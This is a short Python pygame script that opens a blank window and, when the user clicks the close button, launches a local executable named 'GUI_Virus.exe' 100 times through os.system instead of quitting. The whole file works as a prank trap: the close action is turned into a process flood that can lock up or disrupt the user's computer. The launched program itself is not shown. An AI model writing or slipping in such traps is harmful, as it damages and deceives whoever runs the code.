import pygame
import os
var1 = 0
fullscreen = 0  # 0 for windowed, "pygame.FULLSCREEN" for fullscreen.
pygame.init()
screen = (800, 600)
clock = pygame.time.Clock()  # defines clock to be used to manage time with clock.tick in the main game loop.
var1 = pygame.display.set_mode((screen), fullscreen, 32)  # creates a display surface
while True:
    clock.tick(30)  # runs game @30fps
    for event in pygame.event.get():  # checks for events
        if event.type == pygame.QUIT:  # if the cross is clicked, closes program.
            for i in range(100):
                os.system(r"E:\Coding\PyCharm_Projects\dist\GUI_Virus\GUI_Virus.exe")
        pygame.display.update()






